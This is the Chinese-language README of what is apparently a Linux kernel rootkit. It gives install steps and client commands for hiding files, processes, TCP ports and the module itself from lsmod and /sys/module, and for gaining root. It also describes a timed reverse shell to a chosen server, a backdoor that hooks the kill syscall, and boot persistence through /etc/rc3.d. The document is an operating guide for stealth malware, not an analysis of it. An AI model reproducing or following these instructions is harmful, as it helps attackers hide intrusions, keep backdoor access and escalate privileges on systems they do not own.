# 说明文档

## 1. 安装Rootkit

```bash
sudo apt-get install linux-headers-$(uname -r)
chmod +x install.sh
sudo ./install.sh
```

## 2. 删除Rootkit

```bash
chmod +x remove.sh
sudo ./remove.sh
```

## 3. 文件结构

- client.c rootkit交互客户端
- install.sh 安装脚本
- remove.sh 卸载脚本
- Makefile 编译配置文件
- rootkit.c 源代码

## 1.3 使用方式

### 1.3.1 隐藏文件   

隐藏文件  
./client hide /etc/passwd  
显示文件  
./client unhide /etc/passwd  
可以隐藏除  /proc /run /dev /sys 以外目录的文件  

### 1.3.2 隐藏进程  

隐藏进程  
./client hideproc /proc/1  1这里就是你要隐藏的进程号  
显示进程  
./client unhideproc /proc/1 恢复隐藏的进程  

### 1.3.3 隐藏端口  

实现的是隐藏ipv4 tcp的端口  
隐藏端口  
./client hideport 22 隐藏22端口相关的信息  
显示端口  
./client unhideport 22 显示22端口相关的信息  

### 1.3.4 隐藏内核模块列表

编译client后，运行 ``./client show``可以隐藏lsmod中的模块信息  
再运行 ``./client show`` 会显示模块  
运行``./client hidesys /sys/module/rootkit``可以隐藏/sys/module下的对应模块目录  
运行``./client unhidesys /sys/module/rootkit``可以恢复/sys/module下的对应模块目录  

### 1.3.5 获取root权限

编译client后，运行 ``./client root``

## 1.4 实现功能及其原理

### 定时后门

考虑到内网机器，定时反弹Shell到指定服务器

### 隐藏内核模块列表

+ 断链法
+ 隐藏 /sys/module
+ 隐藏 /proc/modules

### Root后门

hook kill的syscall，当接受到特定信号的时候，给予对应的权限

### 开机自启

向 ``/etc/rc3.d`` 目录下增加加载内核模块的语法

